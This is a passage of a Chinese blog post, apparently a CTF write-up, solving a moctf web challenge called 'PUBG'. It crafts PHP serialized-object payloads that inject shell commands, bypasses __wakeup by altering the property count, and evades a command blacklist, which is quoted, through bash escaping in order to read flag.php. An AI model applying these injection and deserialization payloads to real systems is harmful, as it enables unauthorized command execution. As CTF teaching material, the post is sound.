+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"//win.php &amp;&amp; whoami &amp;&amp; index"</span>;    <span class="comment">//这里的index是为了闭合后面的.php</span></span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br><span class="line">       <span class="keyword">echo</span> urlencode($a);                <span class="comment">//记得URL编码上次校赛的坑现在还是记得的。。。。。</span></span><br></pre></td></tr></table></figure>
+<p>你问我为什么bag要以win.php开头？<br>看看这里就知道了，这一句表明肯定有这样的一个文件，我直接构造就好了<br><a href="https://imgchr.com/i/9oluIP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9oluIP.png" alt="9oluIP.png"></a></p>
+<p>这里的$a参数出来的是下面的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:28:&quot;//win.php &amp;&amp; whoami &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>但是在反序列化的时候会自动调用<strong>wakeup()函数，从而导致了构造的类里面的变量重定义了，这就会导致失败了<br>所以我们还得绕过</strong>wakeup()函数<br>所以我们就改成这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:20:&#123;s:3:&quot;bag&quot;;s:28:&quot;//win.php &amp;&amp; whoami &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>urlencode之后变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A28%3A%22%2F%2Fwin.php+%26%26+whoami+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure>
+<p>出现了<code>Winner Winner,Chicken Dinner&lt;/center&gt;www-data</code><br>证明我们成功了，改一下语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"/win.php &amp;&amp; sort waf"</span>;  </span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
+<p>出现一段代码，自己拼接一下吧<br>得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">       $black = <span class="keyword">array</span>(<span class="string">'vi'</span>,<span class="string">'awk'</span>,<span class="string">'-'</span>,<span class="string">'sed'</span>,<span class="string">'comm'</span>,<span class="string">'diff'</span>,<span class="string">'grep'</span>,<span class="string">'cp'</span>,<span class="string">'mv'</span>,<span class="string">'nl'</span>,<span class="string">'less'</span>,<span class="string">'od'</span>,<span class="string">'head'</span>,<span class="string">'tail'</span>,<span class="string">'more'</span>,<span class="string">'tac'</span>,<span class="string">'rm'</span>,<span class="string">'ls'</span>,<span class="string">'tailf'</span>,<span class="string">'%'</span>,<span class="string">'%0a'</span>,<span class="string">'%0d'</span>,<span class="string">'%00'</span>,<span class="string">'ls'</span>,<span class="string">'echo'</span>,<span class="string">'ps'</span>,<span class="string">'&gt;'</span>,<span class="string">'&lt;'</span>,<span class="string">'$&#123;IFS&#125;'</span>,<span class="string">'ifconfig'</span>,<span class="string">'mkdir'</span>,<span class="string">'cp'</span>,<span class="string">'chmod'</span>,<span class="string">'wget'</span>,<span class="string">'curl'</span>,<span class="string">'http'</span>,<span class="string">'www'</span>,<span class="string">'`'</span>,<span class="string">'printf'</span>);</span><br><span class="line">        $black = []; </span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($values)</span></span>&#123; </span><br><span class="line">         	 <span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;  <span class="keyword">if</span>(stripos($values,$value))&#123;<span class="keyword">die</span>(<span class="string">"Attack!"</span>); &#125; &#125;</span><br><span class="line"></span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
+<p>发现我们可以用bash的特性绕过<br><a href="https://imgchr.com/i/9olnat" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olnat.png" alt="9olnat.png"></a></p>
+<p>再改一下payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"/win.php &amp;&amp; l\s &amp;&amp; index"</span>;    /</span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
+<p>得到一堆文件列表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class </span><br><span class="line">  class.php </span><br><span class="line">  class.php.bak </span><br><span class="line">  image </span><br><span class="line">  index.php </span><br><span class="line">  index.php.bak </span><br><span class="line">  waf.php</span><br></pre></td></tr></table></figure>
+<p>用pwd命令查看当前所在目录为/app，再find一下，找出该目录下所有的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/app </span><br><span class="line">/app/class </span><br><span class="line">/app/class/win.php </span><br><span class="line">/app/class/flag.php </span><br><span class="line">/app/image </span><br><span class="line">/app/image/PUBG.jpg </span><br><span class="line">/app/index.php.bak </span><br><span class="line">/app/waf.php </span><br><span class="line">/app/class.php </span><br><span class="line">/app/class.php.bak </span><br><span class="line">/app/index.php</span><br></pre></td></tr></table></figure>
+<p>最后发现应该在flag.php里面<br>于是最后改payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:20:&#123;s:3:&quot;bag&quot;;s:45:&quot;/win.php &amp;&amp; sort /app/class/flag.php &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>得到flag<br><a href="https://imgchr.com/i/9olMPf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olMPf.png" alt="9olMPf.png"></a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/03/06/moctfweb/">简单小结一下moctf的两道web题</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
+        <p><span>发布时间:</span>2018-03-06, 23:14:34</p>
+        <p><span>最后更新:</span>2018-04-16, 22:39:10</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/03/06/moctfweb/" title="简单小结一下moctf的两道web题">http://0verwatch.top/2018/03/06/moctfweb/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0verwatch.top/2018/03/06/moctfweb/　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2018/03/09/hashlengthattack/">
+                    记录一下Hash长度扩展攻击的几个题目
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/03/03/backupblogagain/">
+                    重装系统后快速恢复hexo博客(保留了原有的博客文件夹)
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#死亡退出"><span class="toc-number">1.</span> <span class="toc-text">死亡退出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unset"><span class="toc-number">2.</span> <span class="toc-text">unset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PUBG"><span class="toc-number">3.</span> <span class="toc-text">PUBG</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"简单小结一下moctf的两道web题　| 0verWatch's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2018/03/09/hashlengthattack/" title="上一篇: 记录一下Hash长度扩展攻击的几个题目">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/03/03/backupblogagain/" title="下一篇: 重装系统后快速恢复hexo博客(保留了原有的博客文件夹)">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/git-learning/">Git学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/11/PHP-Yii/">PHP_Yii框架学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/06/sovleme-kr-wp/">sovleme.kr_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/06/whalectfweb1/">WhaleCTF第一期打卡的几个web题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/18/shiyanba1wp/">实验吧 忘记密码了wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/18/phpcheck2/">记一道代码审计题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/CTFpython/">小结一波CTF里面可能用到的脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/11/Ubantu-Web/">Ubantu下部署LAMP以及复现一道CTF题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/11/cumtphpfanxuliehua/">浅析cumt平台上的一道反序列化题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/RaceConditionsSummary/">简单小结一下Web条件竞争的题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/09/hashlengthattack/">记录一下Hash长度扩展攻击的几个题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/moctfweb/">简单小结一下moctf的两道web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/backupblogagain/">重装系统后快速恢复hexo博客(保留了原有的博客文件夹)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/25/RSASimple/">大致了解一下RSA以及出题套路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/24/CRC32Brute/">CRC32爆破小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/23/Linuxcaiji/">熟悉Linux命令~~~</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/17/bugkuphpshenjiwp/">bugku 代码审计 write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/14/bugku-Web-write-up/">bugku Web write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/14/bugkuMiscwp/">bugku Misc write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/12/bugkuCrypto/">bugku Crypto write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/08/bugku-social-wp/">bugku Social write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/08/zipfalse/">zip伪加密[转载]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/07/php-mysql-content/">php+mysql留言板实现代码分享</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/04/sql-Summary/">对数据库学习的大致总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/02/php summary/">php留言板编写总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/Csharpwork4/">程序设计课 C#的作业报告四</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/Csharpwork3/">程序设计课 C#的作业报告三</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/Csharpwork2/">程序设计课 C#作业报告二</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/Csharpwork1/">程序设计课 C#的作业报告一</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 0verWatch
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> 
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
